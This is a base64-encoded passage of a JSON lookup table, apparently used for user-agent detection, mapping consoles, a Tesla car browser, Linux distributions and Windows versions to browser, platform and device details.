mNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIk5pbnRlbmRvXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJyZW5kZXJpbmcgZW5naW5lXCI6IFwiV2ViS2l0LlwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIkJyb3dzZXIuXCJcclxuICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcIm5hbWVcIjogXCJOaW50ZW5kbyAzRFNcIiwgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIiwgXCJkZXZlbG9wZXJcIjogXCJOaW50ZW5kb1wifSxcclxuICAgICAgICAgICAgICAgIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJOZXcgM0RTXCIsIFwidHlwZVwiOiBcIkNvbnNvbGVcIiwgXCJ2ZW5kb3JcIjogXCJOaW50ZW5kb1wiLCBcImJyYW5kXCI6IFwiTmludGVuZG9cIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJQbGF5c3RhdGlvbiBQb3J0YWJsZVwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIkJyb3dzZXJcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlNvbnkgUFNQXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIlNvbnlcIixcclxuICAgICAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJCcm93c2VyLlwiXHJcbiAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XCJuYW1lXCI6IFwiSkFWQVwiLCBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLCBcImRldmVsb3BlclwiOiBcIk9yYWNsZVwifSxcclxuICAgICAgICAgICAgICAgIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJQbGF5c3RhdGlvbiBQb3J0YWJsZVwiLCBcInR5cGVcIjogXCJDb25zb2xlXCIsIFwidmVuZG9yXCI6IFwiU29ueVwiLCBcImJyYW5kXCI6IFwiU29ueVwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIlBsYXlTdGF0aW9uIFZpdGFcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJCcm93c2VyXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJQbGF5c3RhdGlvbiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJTb255XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJyZW5kZXJpbmcgZW5naW5lXCI6IFwiV2ViS2l0LlwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIkJyb3dzZXIuXCJcclxuICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcIm5hbWVcIjogXCJQbGF5U3RhdGlvbiBWaXRhXCIsIFwiZGV2ZWxvcGVyXCI6IFwiT3JhY2xlXCJ9LFxyXG4gICAgICAgICAgICAgICAgXCJEZXZpY2VcIjoge1wibmFtZVwiOiBcIlBsYXlTdGF0aW9uIFZpdGFcIiwgXCJ0eXBlXCI6IFwiQ29uc29sZVwiLCBcInZlbmRvclwiOiBcIlNvbnlcIiwgXCJicmFuZFwiOiBcIlNvbnlcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJTd2l0Y2hcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJCcm93c2VyXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJOaW50ZW5kbyBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIk5pbnRlbmRvXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJyZW5kZXJpbmcgZW5naW5lXCI6IFwiV2ViS2l0LlwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIkJyb3dzZXIuXCJcclxuICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcIm5hbWVcIjogXCJOaW50ZW5kbyBTd2l0Y2hcIiwgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIiwgXCJkZXZlbG9wZXJcIjogXCJOaW50ZW5kb1wifSxcclxuICAgICAgICAgICAgICAgIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJTd2l0Y2hcIiwgXCJ0eXBlXCI6IFwiQ29uc29sZVwiLCBcInZlbmRvclwiOiBcIk5pbnRlbmRvXCIsIFwiYnJhbmRcIjogXCJOaW50ZW5kb1wifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIkFtaWdhXCI6IHtcclxuICAgICAgICAgICAgICAgIFwiQnJvd3NlclwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiSUJyb3dzZVwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJTdGVmYW4gQnVyc3Ryb2VtXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiQnJvd3Nlci5cIlxyXG4gICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1wibmFtZVwiOiBcIkFtaWdhIE9TXCIsIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsIFwiZGV2ZWxvcGVyXCI6IFwiQ29tbW9kb3JlIEludGVybmF0aW9uYWxcIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQW1pZ2FcIixcclxuICAgICAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJEZXNrdG9wXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJ2ZW5kb3JcIjogXCJDb21tb2RvcmUgSW50ZXJuYXRpb25hbFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiYnJhbmRcIjogXCJDb21tb2RvcmVcIlxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIkRBMjQxSExcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJCcm93c2VyXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJDaHJvbWVcIixcclxuICAgICAgICAgICAgICAgICAgICBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGV2ZWxvcGVyXCI6IFwiR29vZ2xlIEluY1wiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIkJyb3dzZXIuXCJcclxuICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcIm5hbWVcIjogXCJBbmRyb2lkXCIsIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsIFwiZGV2ZWxvcGVyXCI6IFwiR29vZ2xlIEluY1wifSxcclxuICAgICAgICAgICAgICAgIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJEQSAyNDFITFwiLCBcInR5cGVcIjogXCJEZXNrdG9wXCIsIFwidmVuZG9yXCI6IFwiQWNlclwiLCBcImJyYW5kXCI6IFwiQWNlclwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcInRlc2xhXCI6IHtcclxuICAgICAgICAgICAgICAgIFwiQnJvd3NlclwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiVGVzbGEgQ2FyIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgICAgICBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGV2ZWxvcGVyXCI6IFwiVGVzbGEgTW90b3JzLlwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwicmVuZGVyaW5nIGVuZ2luZVwiOiBcIkJsaW5rLlwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIkJyb3dzZXIuXCJcclxuICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcIm5hbWVcIjogXCJMaW51eFwiLCBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLCBcImRldmVsb3BlclwiOiBcIkxpbnV4IEZvdW5kYXRpb25cIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQ2FyXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiQ2FyIEVudGVydGFpbm1lbnQgRnJhbWV3b3JrXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJ2ZW5kb3JcIjogXCJUZXNsYSBNb3RvcnNcIixcclxuICAgICAgICAgICAgICAgICAgICBcImJyYW5kXCI6IFwiVGVzbGFcIlxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIlF0Q2FyQnJvd3NlclwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIkJyb3dzZXJcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlRlc2xhIENhciBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIlRlc2xhIE1vdG9ycy5cIixcclxuICAgICAgICAgICAgICAgICAgICBcInJlbmRlcmluZyBlbmdpbmVcIjogXCJCbGluay5cIixcclxuICAgICAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJCcm93c2VyLlwiXHJcbiAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XCJuYW1lXCI6IFwiTGludXhcIiwgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIiwgXCJkZXZlbG9wZXJcIjogXCJMaW51eCBGb3VuZGF0aW9uXCJ9LFxyXG4gICAgICAgICAgICAgICAgXCJEZXZpY2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkNhclwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIkNhciBFbnRlcnRhaW5tZW50IEZyYW1ld29ya1wiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwidmVuZG9yXCI6IFwiVGVzbGEgTW90b3JzXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJicmFuZFwiOiBcIlRlc2xhXCJcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJmcmVlYnNkXCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1wibmFtZVwiOiBcIkZyZWVCU0RcIiwgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIiwgXCJkZXZlbG9wZXJcIjogXCJGcmVlQlNEIEZvdW5kYXRpb25cIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ29tcHV0ZXJcIiwgXCJ0eXBlXCI6IFwiTGludXggRGVza3RvcFwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIkNyT1NcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XCJuYW1lXCI6IFwiQ2hyb21lIE9TXCIsIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsIFwiZGV2ZWxvcGVyXCI6IFwiR29vZ2xlIEluY1wifSxcclxuICAgICAgICAgICAgICAgIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJDb21wdXRlclwiLCBcInR5cGVcIjogXCJEZXNrdG9wXCJ9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiVWJ1bnR1XCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1wibmFtZVwiOiBcIlVidW50dSBPU1wiLCBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLCBcImRldmVsb3BlclwiOiBcIkNhbm9uaWNhbCBJbmNcIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ29tcHV0ZXJcIiwgXCJ0eXBlXCI6IFwiTGludXggRGVza3RvcFwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIkFyY2ggTGludXhcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XCJuYW1lXCI6IFwiQXJjaCBMaW51eFwiLCBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLCBcImRldmVsb3BlclwiOiBcIkFyY2ggTGludXhcIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ29tcHV0ZXJcIiwgXCJ0eXBlXCI6IFwiTGludXggRGVza3RvcFwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcImxpbnV4XCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1wibmFtZVwiOiBcIkxpbnV4XCIsIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsIFwiZGV2ZWxvcGVyXCI6IFwiTGludXggRm91bmRhdGlvblwifSxcclxuICAgICAgICAgICAgICAgIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJDb21wdXRlclwiLCBcInR5cGVcIjogXCJMaW51eCBEZXNrdG9wXCJ9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiZGViaWFuXCI6IFwiRGViaWFuXCIsXHJcbiAgICAgICAgICAgIFwibWFuamFyb1wiOiBcIm1hbmphcm9cIixcclxuICAgICAgICAgICAgXCJzdW5vc1wiOiBcIlN1biBTb2xhcmlzXCIsXHJcbiAgICAgICAgICAgIFwiYmVvc1wiOiBcIkJlT1NcIixcclxuICAgICAgICAgICAgXCJhcGFjaGViZW5jaFwiOiBcIkFwYWNoZUJlbmNoXCIsXHJcbiAgICAgICAgICAgIFwiYWl4XCI6IFwiQUlYXCIsXHJcbiAgICAgICAgICAgIFwiaXJpeFwiOiBcIklyaXhcIixcclxuICAgICAgICAgICAgXCJvc2ZcIjogXCJERUMgT1NGXCIsXHJcbiAgICAgICAgICAgIFwiaHAtdXhcIjogXCJIUC1VWFwiLFxyXG4gICAgICAgICAgICBcIm5ldGJzZFwiOiBcIk5ldEJTRFwiLFxyXG4gICAgICAgICAgICBcImJzZGlcIjogXCJCU0RpXCIsXHJcbiAgICAgICAgICAgIFwib3BlbmJzZFwiOiBcIk9wZW5CU0RcIixcclxuICAgICAgICAgICAgXCJnbnVcIjogXCJHTlVcXC9MaW51eFwiLFxyXG4gICAgICAgICAgICBcInVuaXhcIjogXCJVbmtub3duIFVuaXggT1NcIixcclxuICAgICAgICAgICAgXCJ1YnVudHVcIjogXCJVYnVudHVcIixcclxuICAgICAgICAgICAgXCJSSVNDIE9TXCI6IFwiUklTQyBPU1wiLFxyXG4gICAgICAgICAgICBcIkRhcndpblwiOiBcIk1BQyBPU1wiLFxyXG4gICAgICAgICAgICBcIkhhaWt1XCI6IFwiSGFpa3UgT1NcIixcclxuICAgICAgICAgICAgXCJGcmVlTWlOVFwiOiBcIkZyZWVNaU5UIE9TXCIsXHJcbiAgICAgICAgICAgIFwid2luZG93cyBwaG9uZSA4XCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIldpbmRvd3MgUGhvbmUgOFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJNaWNyb3NvZnQgQ29ycFwiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiV2luZG93cyBQaG9uZVwiLCBcInR5cGVcIjogXCJwaG9uZVwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIndpbmRvd3MgcGhvbmUgb3MgN1wiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJXaW5kb3dzIFBob25lIDdcIixcclxuICAgICAgICAgICAgICAgICAgICBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGV2ZWxvcGVyXCI6IFwiTWljcm9zb2Z0IENvcnBcIlxyXG4gICAgICAgICAgICAgICAgfSwgXCJEZXZpY2VcIjoge1wibmFtZVwiOiBcIldpbmRvd3MgUGhvbmVcIiwgXCJ0eXBlXCI6IFwicGhvbmVcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJ3aW5kb3dzIG50IDEwXCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIldpbmRvd3MgMTBcIixcclxuICAgICAgICAgICAgICAgICAgICBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGV2ZWxvcGVyXCI6IFwiTWljcm9zb2Z0IENvcnBcIlxyXG4gICAgICAgICAgICAgICAgfSwgXCJEZXZpY2VcIjoge1wibmFtZVwiOiBcIkNvbXB1dGVyXCIsIFwidHlwZVwiOiBcIkRlc2t0b3BcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJ3aW5kb3dzIG50IDYuM1wiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJXaW5kb3dzIDguMVwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJNaWNyb3NvZnQgQ29ycFwiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ29tcHV0ZXJcIiwgXCJ0eXBlXCI6IFwiRGVza3RvcFwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIndpbmRvd3MgbnQgNi4yXCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIldpbmRvd3MgOFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJNaWNyb3NvZnQgQ29ycFwiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ29tcHV0ZXJcIiwgXCJ0eXBlXCI6IFwiRGVza3RvcFwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIndpbmRvd3MgbnQgNi4xXCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIldpbmRvd3MgN1wiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJNaWNyb3NvZnQgQ29ycFwiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ29tcHV0ZXJcIiwgXCJ0eXBlXCI6IFwiRGVza3RvcFwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIndpbmRvd3MgbnQgNi4wXCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIldpbmRvd3MgTG9uZ2hvcm5cIixcclxuICAgICAgICAgICAgICAgICAgICBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGV2ZWxvcGVyXCI6IFwiTWljcm9zb2Z0IENvcnBcIlxyXG4gICAgICAgICAgICAgICAgfSwgXCJEZXZpY2VcIjoge1wibmFtZVwiOiBcIkNvbXB1dGVyXCIsIFwidHlwZVwiOiBcIkRlc2t0b3BcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJ3aW5kb3dzIG50IDUuMlwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJXaW5kb3dzIDIwMDNcIixcclxuICAgICAgICAgICAgICAgICAgICBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGV2ZWxvcGVyXCI6IFwiTWljcm9zb2Z0IENvcnBcIlxyXG4gICAgICAgICAgICAgICAgfSwgXCJEZXZpY2VcIjoge1wibmFtZVwiOiBcIkNvbXB1dGVyXCIsIFwidHlwZVwiOiBcIkRlc2t0b3BcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJ3aW5kb3dzIG50IDUuMVwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJXaW5kb3dzIFhQXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIk1pY3Jvc29mdCBDb3JwXCJcclxuICAgICAgICAgICAgICAgIH0sIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJDb21wdXRlclwiLCBcInR5cGVcIjogXCJEZXNrdG9wXCJ9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwid2luZG93cyB4cFwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcIm5hbWVcIjogXCJXaW5kb3dzIFhQXCIsIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsIFwiZGV2ZWxvcGVyXCI6IFwiTWljcm9zb2Z0IENvcnBcIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ29tcHV0ZXJcIiwgXCJ0eXBlXCI6IFwiRGVza3RvcFwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIndpbmRvd3MgbnQgNS4wXCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIldpbmRvd3MgMjAwMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJNaWNyb3NvZnQgQ29ycFwiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ29tcHV0ZXJcIiwgXCJ0eXBlXCI6IFwiRGVza3RvcFwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIndpbmRvd3MgbWVcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XCJuYW1lXCI6IFwiV2luZG93cyBNRVwiLCBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLCBcImRldmVsb3BlclwiOiBcIk1pY3Jvc29mdCBDb3JwXCJ9LFxyXG4gICAgICAgICAgICAgICAgXCJEZXZpY2VcIjoge1wibmFtZVwiOiBcIkNvbXB1dGVyXCIsIFwidHlwZVwiOiBcIkRlc2t0b3BcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJ3aW5kb3dzIG50IDQuMFwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJXaW5kb3dzIE5UIDQuMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJNaWNyb3NvZnQgQ29ycFwiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ29tcHV0ZXJcIiwgXCJ0eXBlXCI6IFwiRGVza3RvcFwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIndpbm50NC4wXCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIldpbmRvd3MgTlQgNC4wXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIk1pY3Jvc29mdCBDb3JwXCJcclxuICAgICAgICAgICAgICAgIH0sIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJDb21wdXRlclwiLCBcInR5cGVcIjogXCJEZXNrdG9wXCJ9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwid2lubnQgNC4wXCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1wibmFtZVwiOiBcIldpbmRvd3MgTlRcIiwgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIiwgXCJkZXZlbG9wZXJcIjogXCJNaWNyb3NvZnQgQ29ycFwifSxcclxuICAgICAgICAgICAgICAgIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJDb21wdXRlclwiLCBcInR5cGVcIjogXCJEZXNrdG9wXCJ9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwid2lublxcXFxcXC90XCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1wibmFtZVwiOiBcIldpbmRvd3MgTlRcIiwgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIiwgXCJkZXZlbG9wZXJcIjogXCJNaWNyb3NvZnQgQ29ycFwifSxcclxuICAgICAgICAgICAgICAgIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJDb21wdXRlclwiLCBcInR5cGVcIjogXCJEZXNrdG9wXCJ9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwid2luZG93cyA5OFwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcIm5hbWVcIjogXCJXaW5kb3dzIDk4XCIsIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsIFwiZGV2ZWxvcGVyXCI6IFwiTWljcm9zb2Z0IENvcnBcIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ29tcHV0ZXJcIiwgXCJ0eXBlXCI6IFwiRGVza3RvcFwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIndpbjk4XCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1wibmFtZVwiOiBcIldpbmRvd3MgOThcIiwgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIiwgXCJkZXZlbG9wZXJcIjogXCJNaWNyb3NvZnQgQ29ycFwifSxcclxuICAgICAgICAgICAgICAgIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJDb21wdXRlclwiLCBcInR5cGVcIjogXCJEZXNrdG9wXCJ9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAg